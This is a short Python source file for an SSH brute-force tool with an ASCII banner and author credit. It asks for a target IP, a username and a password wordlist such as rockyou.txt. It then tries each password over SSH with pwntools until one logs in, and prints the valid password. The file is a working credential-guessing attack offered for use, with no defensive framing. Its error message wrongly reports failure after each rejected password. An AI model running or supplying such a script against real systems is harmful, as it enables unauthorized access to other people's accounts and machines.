from colorama import Back, Fore, init, Style
import paramiko.ssh_exception
from pwn import * # type: ignore
import paramiko



# Banner Section
print("\n")
print("\t\t██████╗ ██████╗ ██████╗ ██╗    ██╗██╗  ██╗███╗   ██╗")
print("\t\t██╔══██╗╚════██╗██╔══██╗██║    ██║██║  ██║████╗  ██║")
print("\t\t██████╔╝ █████╔╝██║  ██║██║ █╗ ██║███████║██╔██╗ ██║")
print("\t\t██╔══██╗ ╚═══██╗██║  ██║██║███╗██║╚════██║██║╚██╗██║")
print("\t\t██║  ██║██████╔╝██████╔╝╚███╔███╔╝     ██║██║ ╚████║")
print("\t\t╚═╝  ╚═╝╚═════╝ ╚═════╝  ╚══╝╚══╝      ╚═╝╚═╝  ╚═══╝")
print("\t\t\t\t\t\tSSH BRUTE FORCE : 1.0")
print(Fore.RED + "Author   : Redwan Ahmed \nGitHub   : http://github.com/r3dw4n48m3d \nLinkedIn : https://www.linkedin.com/in/r3dw4n4hm3d/")
print(Fore.BLUE + "This tool is for SSH Login Brute-Forceing\nTo use this Tool you need" + Fore.YELLOW  + " USERNAME " + Fore.BLUE + "of the system, The" + Fore.YELLOW  + " IP " + Fore.BLUE + "of the system and Also a " + Fore.YELLOW  + "PASSWORD WORDLIST ")


# Imput and Declareation Task 
print("\n")
host = input(Fore.MAGENTA + "Enter the IP of the system (E.G >> 127.0.0.1)  >> ")
username = input(Fore.MAGENTA + "Enter the Username of the system (E.G >> kali) >> ")
wordlist = input(Fore.MAGENTA + "Enter a wordlist (E.G >> rockyou.txt)          >> ")
attempts = 0

# Main Taks
with open("{}".format(wordlist),"r") as password_list:
    for password in password_list:
        password = password.strip("\n")
        try:
            print(Fore.YELLOW + "[{}] Attempting Password : ".format(attempts) + Fore.MAGENTA + "'{}'!".format(password))
            response = ssh(host=host, user=username, password=password, timeout=1) # type: ignore
            if response.connected():
                print(Fore.CYAN + "\n[>>] Valid Password Found : '{}'!\n".format(password))
                response.close()
                break
            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print(Fore.RED + "[X] Password Not Found for the Given Wordlist")
        except Exception as e:
            print(f"[!] An error occurred: {e}")
        attempts += 1
        

